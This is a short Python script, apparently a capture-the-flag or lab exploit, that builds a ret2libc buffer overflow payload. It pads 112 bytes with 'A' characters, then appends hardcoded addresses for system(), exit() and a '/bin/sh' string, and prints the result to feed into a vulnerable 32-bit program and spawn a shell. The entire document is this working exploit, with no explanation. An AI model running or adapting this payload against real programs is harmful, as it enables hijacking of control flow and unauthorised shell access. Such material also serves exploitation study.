import struct

# Memory address of system
system_addr = struct.pack("<I",0xf7e116e0)

# Exit address
exit_addr = struct.pack("<I",0xf7e047a0)

# Memory address of /bin/sh
arg_addr = struct.pack("<I",0xf7f4ef68)


buf = "A" * 112
buf += system_addr
buf += exit_addr
buf += arg_addr

print(buf)
